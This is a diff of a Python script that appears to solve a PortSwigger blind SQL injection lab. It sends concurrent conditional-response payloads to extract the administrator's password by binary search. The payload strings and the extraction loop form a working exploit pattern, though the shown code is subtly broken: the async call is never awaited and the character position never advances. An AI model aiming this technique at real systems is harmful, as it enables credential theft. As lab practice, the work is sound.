@@ -33,10 +33,8 @@ software for malicious purposes.
 # Lab Link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
 # Last Modified: 2024/12/19
 
-import requests
 import aiohttp
 import asyncio
-import re
 import tracemalloc
 import time
 from typing import *
@@ -101,14 +99,13 @@ async def binary_search_test_async(sql_1: str, sql_2: str, pattern: str) -> int:
             high = mid - 1
     return -1
 
-async def get_data_with_binary_search_async(password_length: int, pattern: str) -> None:
-    # sql_injection: str = "' and substr((select password from users where username='administrator'),1,1)='20"
-    data_str: str = ''
+async def get_data_with_binary_search_async(password_length: int, pattern: str) -> str:
+    result: str = ''
     tasks: List = []
     count: int = 0
     while count < password_length:
-        sql_injection_1: str = f"' and substr((select password from users where username='administrator'), 1, 1) = ' "
-        sql_injection_2: str = f"' and substr((select password from users where username='administrator'), 1, 1) > ' "
+        sql_injection_1: str = f" ' and substr((select password from users where username='administrator'), 1, 1) = ' "
+        sql_injection_2: str = f" ' and substr((select password from users where username='administrator'), 1, 1) > ' "
         tasks.append(binary_search_test_async(sql_1=sql_injection_1, sql_2=sql_injection_2, pattern=pattern))
         count = count + 1
     result = await asyncio.gather(*tasks)
@@ -117,10 +114,9 @@ async def get_data_with_binary_search_async(password_length: int, pattern: str) 
             print(f'Not found the index of data char')
         else:
             data_char_ascii = all_char_ascii_sorted_list[r]
-            data_str = data_str + chr(data_char_ascii)
+            result = result + chr(data_char_ascii)
+    return result
 
-get_data_with_binary_search_async(password_length=20, pattern='Welcome back')
-# response = requests.get(url, headers=headers)
-# print("Status Code:", response.status_code)
-# print("Response Headers:", response.headers)
-# print("Response Body:", response.text)
+# Testing
+result: str = get_data_with_binary_search_async(password_length=20, pattern='Welcome back')
+print(f'Password is : {result}')
